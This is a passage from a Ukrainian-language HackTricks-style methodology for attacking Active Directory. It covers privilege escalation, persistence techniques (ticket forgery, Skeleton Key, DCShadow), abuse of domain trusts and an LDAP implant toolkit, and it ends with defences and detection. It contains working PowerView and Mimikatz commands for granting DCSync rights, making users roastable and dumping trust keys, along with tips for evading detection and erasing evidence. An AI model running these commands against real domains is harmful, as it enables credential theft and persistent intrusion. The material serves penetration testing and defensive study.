{{#endref}}

### Resourced-based Constrain Delegation

Наявність привілею **WRITE** над Active Directory object віддаленого computer дає змогу отримати code execution із **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Зловживання Permissions/ACLs

Compromised user може мати **цікаві привілеї над певними domain objects**, які можуть дозволити вам пізніше виконати **lateral movement**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Зловживання Printer Spooler service

Виявлення **Spool service listening** у domain можна **abuse**, щоб **acquire new credentials** і **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Зловживання third-party sessions

Якщо **інші користувачі** **access** **compromised** machine, можна **gather credentials from memory** і навіть **inject beacons in their processes**, щоб impersonate їх.\
Зазвичай користувачі access system через RDP, тому тут описано, як виконувати кілька attacks над third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** надає систему для керування **паролем локального Administrator** на domain-joined computers, гарантуючи, що він буде **randomized**, унікальним і часто **changed**. Ці passwords зберігаються в Active Directory, а доступ до них контролюється через ACLs і надається лише authorized users. За наявності достатніх permissions для доступу до цих passwords стає можливим pivoting до інших computers.


{{#ref}}
laps.md
{{#endref}}

### Крадіжка Certificate

**Gathering certificates** із compromised machine може бути способом escalate privileges всередині environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Зловживання Certificate Templates

Якщо налаштовано **vulnerable templates**, їх можна abuse для escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation із high privilege account

### Dumping Domain Credentials

Після отримання privileges рівня **Domain Admin** або, ще краще, **Enterprise Admin**, ви можете **dump** **domain database**: _ntds.dit_.

[**Більше інформації про DCSync attack можна знайти тут**](dcsync.md).

[**Більше інформації про те, як steal NTDS.dit, можна знайти тут**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc як Persistence

Деякі з описаних вище techniques можна використовувати для persistence.\
Наприклад, ви можете:

- Зробити users vulnerable до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити users vulnerable до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати користувачу privileges [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** створює **legitimate Ticket Granting Service (TGS) ticket** для певного service, використовуючи **NTLM hash** (наприклад, **hash PC account**). Цей метод застосовується для **access до service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** передбачає отримання attacker'ом доступу до **NTLM hash облікового запису krbtgt** в середовищі Active Directory (AD). Цей account є особливим, оскільки він використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, необхідних для authentication у мережі AD.

Після отримання цього hash attacker може створювати **TGTs** для будь-якого account на свій вибір (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це подібні до golden tickets, але forged таким чином, що **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Наявність certificates облікового запису або можливість request їх** є дуже хорошим способом зберегти persistence в account користувача (навіть якщо він змінить password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використовуючи certificates, також можна зберегти persistence із high privileges всередині domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Object **AdminSDHolder** в Active Directory забезпечує безпеку **privileged groups** (таких як Domain Admins і Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих groups, щоб запобігти unauthorized changes. Однак цю функцію можна exploit: якщо attacker змінить ACL AdminSDHolder, надавши regular user повний access, цей user отримає extensive control над усіма privileged groups. Отже, цей security measure, призначений для захисту, може мати зворотний ефект і дозволити unwarranted access, якщо його належним чином не monitorити.

[**Більше інформації про AdminDSHolder Group тут.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Усередині кожного **Domain Controller (DC)** існує account **local administrator**. Отримавши admin rights на такій machine, можна extract local Administrator hash за допомогою **mimikatz**. Після цього необхідно змінити registry, щоб **enable use of this password**, що дозволить remote access до local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **надати** **спеціальні permissions** **user** над певними domain objects, що дозволить йому **escalate privileges у майбутньому**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **зберігання** **permissions**, які **object** має **над** **object**. Якщо ви можете лише **внести** **невелику зміну** до **security descriptor** object, ви можете отримати дуже цікаві privileges над цим object без необхідності бути членом privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Зловживайте auxiliary class `dynamicObject`, щоб створювати короткоживучі principals/GPOs/DNS records із `entryTTL`/`msDS-Entry-Time-To-Die`; вони самостійно видаляються без tombstones, стираючи LDAP evidence, але залишаючи orphan SIDs, broken `gPLink` references або cached DNS responses (наприклад, AdminSDHolder ACE pollution або malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змінити **LSASS** у пам'яті, щоб встановити **універсальний пароль**, який надає access до всіх domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Дізнайтеся, що таке SSP (Security Support Provider), тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити **власний SSP**, щоб **capture** у **clear text** **credentials**, які використовуються для access до machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Він реєструє **новий Domain Controller** в AD і використовує його для **push attributes** (SIDHistory, SPNs...) до визначених objects, **не залишаючи жодних logs** щодо **modifications**. Вам **потрібні privileges DA**, і ви маєте перебувати в **root domain**.\
Зверніть увагу: якщо використати неправильні data, з'являться дуже підозрілі logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як escalate privileges, якщо у вас є **достатні permissions для read LAPS passwords**. Однак ці passwords також можна використовувати для **maintain persistence**.\
Перевірте:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як security boundary. Це означає, що **compromising одного domain потенційно може призвести до компрометації всього Forest**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це security mechanism, який дає змогу користувачу з одного **domain** access ресурси в іншому **domain**. По суті, він створює зв'язок між authentication systems двох domains, дозволяючи authentication verifications безперешкодно передаватися між ними. Коли domains налаштовують trust, вони обмінюються та зберігають певні **keys** у своїх **Domain Controllers (DCs)**, що є критично важливим для цілісності trust.

У типовому сценарії, якщо user хоче access service у **trusted domain**, він спочатку request спеціальний ticket, відомий як **inter-realm TGT**, у DC власного domain. Цей TGT encrypted за допомогою спільного **key**, про який домовилися обидва domains. Потім user передає цей TGT до **DC trusted domain**, щоб отримати service ticket (**TGS**). Після успішної validation inter-realm TGT DC trusted domain видає TGS, надаючи user access до service.

**Кроки**:

1. **Client computer** у **Domain 1** починає process, використовуючи свій **NTLM hash**, щоб request **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо client успішно authenticated.
3. Потім client request **inter-realm TGT** у DC1, який потрібен для access до resources у **Domain 2**.
4. Inter-realm TGT encrypted за допомогою **trust key**, спільного для DC1 і DC2 у межах two-way domain trust.
5. Client передає inter-realm TGT до **Domain Controller (DC2) Domain 2**.
6. DC2 перевіряє inter-realm TGT за допомогою спільного trust key і, якщо він valid, видає **Ticket Granting Service (TGS)** для server у Domain 2, до якого client хоче отримати access.
7. Нарешті client передає цей TGS server'у. TGS encrypted за допомогою account hash server'а, щоб отримати access до service у Domain 2.

### Different trusts

Важливо зазначити, що **trust може бути одностороннім або двостороннім**. У двосторонньому варіанті обидва domains довіряють один одному, а в **односторонньому** trust relation один domain буде **trusted**, а інший — **trusting**. В останньому випадку **ви зможете access resources у trusting domain лише з trusted domain**.

Якщо Domain A довіряє Domain B, A є trusting domain, а B — trusted domain. Крім того, для **Domain A** це буде **Outbound trust**, а для **Domain B** — **Inbound trust**.

**Різні trusting relationships**

- **Parent-Child Trusts**: Це поширена конфігурація в межах одного forest, де child domain автоматично має two-way transitive trust зі своїм parent domain. По суті, це означає, що authentication requests можуть безперешкодно проходити між parent і child.
- **Cross-link Trusts**: Так звані "shortcut trusts", що встановлюються між child domains для прискорення referral processes. У складних forests authentication referrals зазвичай мають піднятися до forest root, а потім спуститися до target domain. Створення cross-links скорочує цей шлях, що особливо корисно в географічно розподілених environments.
- **External Trusts**: Вони налаштовуються між різними, не пов'язаними domains і за своєю природою є non-transitive. Згідно з [документацією Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для access до resources у domain поза поточним forest, який не підключений через forest trust. Security посилюється завдяки SID filtering з external trusts.
- **Tree-root Trusts**: Ці trusts автоматично встановлюються між forest root domain і новим tree root. Хоча вони зустрічаються нечасто, tree-root trusts важливі для додавання нових domain trees до forest, дозволяючи їм зберігати унікальне domain name та забезпечуючи two-way transitivity. Більше інформації можна знайти в [guidе Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Це two-way transitive trust між двома forest root domains, який також застосовує SID filtering для посилення security measures.
- **MIT Trusts**: Ці trusts встановлюються з non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts є більш спеціалізованими та призначені для environments, що потребують integration із Kerberos-based systems поза Windows ecosystem.

#### Інші відмінності в **trusting relationships**

- Trust relationship також може бути **transitive** (A trust B, B trust C, тоді A trust C) або **non-transitive**.
- Trust relationship може бути налаштований як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (лише один довіряє іншому).

### Attack Path

1. **Enumerate** trusting relationships
2. Перевірте, чи має будь-який **security principal** (user/group/computer) **access** до resources **іншого domain**, наприклад через ACE entries або членство в groups іншого domain. Шукайте **relationships між domains** (ймовірно, саме для цього trust і було створено).
1. У цьому випадку kerberoast може бути ще одним варіантом.
3. **Compromise** **accounts**, які можуть виконувати **pivot** між domains.

Attackers можуть access resources в іншому domain через три основні mechanisms:

- **Local Group Membership**: Principals можуть бути додані до local groups на machines, наприклад до group “Administrators” на server, що надає їм значний control над цією machine.
- **Foreign Domain Group Membership**: Principals також можуть бути members groups у foreign domain. Однак ефективність цього методу залежить від nature trust і scope group.
- **Access Control Lists (ACLs)**: Principals можуть бути вказані в **ACL**, зокрема як entities в **ACEs** усередині **DACL**, що надає їм access до певних resources. Щоб глибше розібратися в mechanics ACLs, DACLs і ACEs, whitepaper під назвою “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є цінним resource.<sup>[[17]](#references)</sup>

### Пошук external users/groups із permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у domain. Це будуть user/group із **external domain/forest**.

Ви можете перевірити це в **Bloodhound** або за допомогою powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Ескалація привілеїв у лісі від дочірнього домену до батьківського
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахування довірчих відносин домену:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існує **2 довірені ключі**: один для _Child --> Parent_, а інший для _Parent_ --> _Child_.\
> Ви можете отримати ключ, який використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Підвищте привілеї до Enterprise admin у дочірньому або батьківському домені, зловживаючи довірою за допомогою SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння способів експлуатації Configuration Naming Context (NC) має вирішальне значення. Configuration NC слугує центральним сховищем даних конфігурації в межах лісу в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у лісі, а writable DC підтримують доступну для запису копію Configuration NC. Для експлуатації цього необхідно мати **SYSTEM privileges on a DC**, бажано на child DC.

**Link GPO to root DC site**

Контейнер Sites у Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, у лісі AD. Маючи SYSTEM privileges на будь-якому DC, атакувальники можуть прив'язати GPO до сайтів root DC. Ця дія потенційно компрометує root domain шляхом маніпулювання політиками, що застосовуються до цих сайтів.

Для отримання детальної інформації можна ознайомитися з дослідженням [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Один із векторів атаки передбачає націлювання на привілейовані gMSA у домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі будь-якого gMSA у всьому лісі.

Детальний аналіз і покрокові інструкції наведено в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Додаткова атака на delegated MSA (BadSuccessor – зловживання migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткове зовнішнє дослідження: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Цей метод вимагає терпіння — необхідно дочекатися створення нових привілейованих об'єктів AD. Маючи SYSTEM privileges, атакувальник може змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над щойно створеними об'єктами AD.

Додаткову інформацію наведено в [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Вразливість ADCS ESC5 спрямована на контроль над об'єктами Public Key Infrastructure (PKI) для створення certificate template, який дає змогу автентифікуватися як будь-який користувач у межах лісу. Оскільки об'єкти PKI розташовані в Configuration NC, компрометація writable child DC дає змогу виконувати атаки ESC5.

Докладніше про це можна прочитати в [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Якщо ADCS відсутній, атакувальник може налаштувати необхідні компоненти, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **вашому домену довіряє** зовнішній домен, який надає вам **невизначені дозволи** в ньому. Вам потрібно з’ясувати, **які суб’єкти вашого домену мають які права доступу до зовнішнього домену**, а потім спробувати використати їх:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній домен лісу — односторонній (вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** **довіряє** деякими **привілеями** принципалу з **іншого домену**.

Однак, коли **домену довіряє** довіряючий домен, довірений домен **створює користувача** з **передбачуваним іменем**, який використовує як **пароль пароль довіреного домену**. Це означає, що можна **отримати доступ до користувача з довіряючого домену, щоб проникнути до довіреного домену**, виконати його enumeration і спробувати підвищити рівень привілеїв:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** від довірчих відносин доменів (що трапляється не дуже часто).

Ще один спосіб скомпрометувати довірений домен — чекати на машині, до якої **може отримати доступ користувач із довіреного домену**, щоб він увійшов через **RDP**. Потім attacker може інжектувати код у процес RDP-сесії та **отримати доступ до вихідного домену жертви** звідти.\
Крім того, якщо **жертва підключила свій жорсткий диск**, attacker із процесу **RDP-сесії** може зберегти **backdoors** у **startup folder жорсткого диска**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Пом'якшення наслідків зловживання довірою доменів

### **SID Filtering:**

- Ризик атак із використанням атрибута SID history між forest trusts зменшується завдяки SID Filtering, який активовано за замовчуванням для всіх inter-forest trusts. Це ґрунтується на припущенні, що intra-forest trusts є безпечними, оскільки відповідно до позиції Microsoft межею безпеки вважається forest, а не domain.
- Однак є нюанс: SID filtering може порушувати роботу застосунків і доступ користувачів, через що його іноді вимикають.

### **Selective Authentication:**

- Для inter-forest trusts використання Selective Authentication гарантує, що користувачі з двох forests не проходять автентифікацію автоматично. Натомість користувачам потрібні явні дозволи для доступу до domains і servers у довіряючому домені або forest.
- Важливо зазначити, що ці заходи не захищають від експлуатації writable Configuration Naming Context (NC) або атак на trust account.

[**Більше інформації про довіру між доменами на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) повторно реалізує LDAP primitives у стилі bloodyAD як x64 Beacon Object Files, що повністю виконуються всередині on-host implant (наприклад, Adaptix C2). Оператори компілюють pack за допомогою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` із beacon. Увесь трафік проходить через поточний logon security context поверх LDAP (389) із signing/sealing або LDAPS (636) з автоматичною довірою до сертифіката, тому socks proxies або disk artifacts не потрібні.<sup>[[4]](#references)</sup>

### LDAP enumeration на стороні implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` і `get-groupmembers` перетворюють короткі імена/шляхи OU на повні DN та виводять відповідні об'єкти.
- `get-object`, `get-attribute` і `get-domaininfo` отримують довільні атрибути (зокрема security descriptors), а також metadata forest/domain із `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` і `get-rbcd` безпосередньо з LDAP показують кандидатів для roasting, параметри delegation та наявні дескриптори [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` і `get-writable --detailed` аналізують DACL, щоб перелічити trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) та inheritance, одразу визначаючи цілі для ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-примітиви запису для ескалації та persistence

- BOF для створення об'єктів (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу підготувати нові principals або облікові записи машин у будь-яких OU, де існують відповідні права. `add-groupmember`, `set-password`, `add-attribute` і `set-attribute` безпосередньо захоплюють цілі після виявлення прав запису властивостей.
- Команди, орієнтовані на ACL, як-от `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` і `add-dcsync`, перетворюють WriteDACL/WriteOwner для будь-якого об'єкта AD на скидання паролів, керування членством у групах або привілеї реплікації DCSync без залишення артефактів PowerShell/ADSI. Відповідні команди `remove-*` очищають ін'єктовані ACE.

### Delegation, roasting і зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача придатним для Kerberoast; `add-asreproastable` (перемикач UAC) позначає його для AS-REP roasting без зміни пароля.
- Макроси Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, прапорці UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, уможливлюючи шляхи атак constrained/unconstrained/RBCD та усуваючи потребу у віддаленому PowerShell або RSAT.

### Ін'єкція sidHistory, переміщення OU та формування поверхні атаки

- `add-sidhistory` ін'єктує привілейовані SID в історію SID контрольованого principal (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп'ютерів або користувачів, даючи зловмиснику змогу перемістити активи до OU, де вже існують делеговані права, перш ніж зловживати `set-password`, `add-groupmember` або `add-spn`.
- Команди видалення з вузькою областю дії (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дають змогу швидко виконати rollback після збору оператором облікових даних або persistence, мінімізуючи telemetry.

## AD -> Azure та Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Деякі загальні засоби захисту

[**Дізнайтеся більше про захист облікових даних тут.**](../stealing-credentials/credentials-protections.md)

### **Захисні заходи для захисту облікових даних**

- **Обмеження для Domain Admins**: Рекомендується дозволяти Domain Admins входити в систему лише на Domain Controllers, не використовуючи їх на інших хостах.
- **Привілеї службових облікових записів**: Служби не повинні запускатися з привілеями Domain Admin (DA), щоб зберігати безпеку.
- **Тимчасове обмеження привілеїв**: Для завдань, що потребують привілеїв DA, їхню тривалість слід обмежувати. Це можна зробити так: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Захист від LDAP relay**: Аудитуйте Event ID 2889/3074/3075, а потім увімкніть LDAP signing і прив'язування каналу LDAPS на DC/клієнтах, щоб блокувати спроби LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Виявлення активності Impacket на рівні протоколу

Якщо ви хочете виявляти поширені AD tradecraft, **не покладайтеся лише на артефакти, контрольовані оператором**, як-от перейменовані binary, назви служб, тимчасові batch-файли або шляхи до результатів. Створіть baseline того, як легітимні клієнти Windows формують трафік [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC і WMI, а потім шукайте **особливості реалізації**, які зберігаються навіть після редагування оператором `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` або `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Кандидати з високою впевненістю як окремі ознаки** (після перевірки за власним baseline):
- Автентифікований DCE/RPC із використанням `auth_context_id = 79231 + ctx_id`
- Заповнення padding автентифікації DCE/RPC значенням `0xff`
- LDAP Kerberos binds, у яких необроблений Kerberos `AP-REQ` безпосередньо розміщується в SPNEGO `mechToken`
- Запити SMB2/3 negotiate зі схожими на ASCII значеннями `ClientGuid`
- WMI `IWbemLevel1Login::NTLMLogin` із нестандартним namespace `//./root/cimv2`
- Жорстко задані значення nonce Kerberos
- **Краще використовувати як ознаки для кореляції/оцінювання**:
- Розріджені або дубльовані списки etype Kerberos, нетипові/відсутні `PA-DATA` або порядок etype у TGS-REQ, що відрізняється від native Windows
- Повідомлення NTLM Type 1 без інформації про версію або повідомлення Type 3 із null-іменами хостів
- Необроблений NTLMSSP у DCE/RPC замість SPNEGO, відсутні verification trailers DCE/RPC або невідповідності OID SPNEGO/Kerberos
- Кілька таких ознак від одного хоста/користувача/сесії/часового проміжку значно сильніші за будь-яке окреме слабке поле
- **Використовуйте як enrichment, а не як окремі alerts**:
- Стандартні filenames, шляхи до результатів, випадкові назви служб, назви тимчасових batch-файлів, стандартні назви облікових записів комп'ютерів і специфічні для інструментів HTTP/WebDAV/RDP/MSSQL strings
- Їх легко змінити операторам, тому найкраще використовувати їх для пояснення, чому cross-protocol cluster є підозрілим
- **Операційні примітки**:
- Для деяких із цих сигналів потрібні розшифрований трафік, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW або видимість на стороні служби
- Перевірте їх за клієнтами Samba/Linux, appliances і legacy software, перш ніж перетворювати на alerts
- Підвищуйте рівень detections від enrichment -> hunting -> alerting у міру зростання впевненості у baseline

### **Реалізація Deception Techniques**

- Реалізація deception передбачає встановлення пасток, як-от decoy users або computers, із такими властивостями, як паролі, що не втрачають чинність, або позначення Trusted for Delegation. Детальний підхід передбачає створення користувачів із певними правами або додавання їх до груп із високими привілеями.<sup>[[2]](#references)</sup>
- Практичний приклад передбачає використання таких інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше інформації про розгортання deception techniques можна знайти на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення Deception**

- **Для об'єктів користувачів**: До підозрілих індикаторів належать нетиповий ObjectSID, рідкісні входи в систему, дати створення та низька кількість невдалих спроб введення пароля.
- **Загальні індикатори**: Порівняння атрибутів потенційних decoy objects зі справжніми об'єктами може виявити невідповідності. Інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти виявити таку deception.

### **Обхід систем виявлення**

- **Обхід Microsoft ATA Detection**:
- **User Enumeration**: Уникайте enumeration сесій на Domain Controllers, щоб запобігти виявленню ATA.
- **Ticket Impersonation**: Використання ключів **aes** для створення ticket допомагає уникнути виявлення, оскільки не відбувається downgrade до NTLM.
- **DCSync Attacks**: Рекомендується виконувати їх із non-Domain Controller, щоб уникнути виявлення ATA, оскільки безпосереднє виконання з Domain Controller спричинить alerts.

## References

- [1] [Посібник з атак на доменні trust](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Підробка trust для deception в Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Від Domain Admin до Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Колекція LDAP BOF — In-Memory LDAP Toolkit для експлуатації Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec — Holy Shuck! Перетворення NTLM-хешів на wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) — Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs — Аналіз Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon — Onelogon: захоплення облікових записів Active Directory через Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft — Як керувати змінами в захищених каналах Netlogon, пов'язаними з CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Подорож у забуті інтерфейси Null Session і MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter як межа безпеки між доменами? (Частина 4) — Дослідження обходу SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter як межа безпеки між доменами? (Частина 5) — Golden GMSA trust attack — від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter як межа безпеки між доменами? (Частина 6) — Schema change trust attack — від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Від DA до EA за допомогою ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Ескалація від адміністраторів дочірнього домену до enterprise admins за 5 хвилин через зловживання AD CS: продовження](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE в рукаві: проєктування DACL backdoors в Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
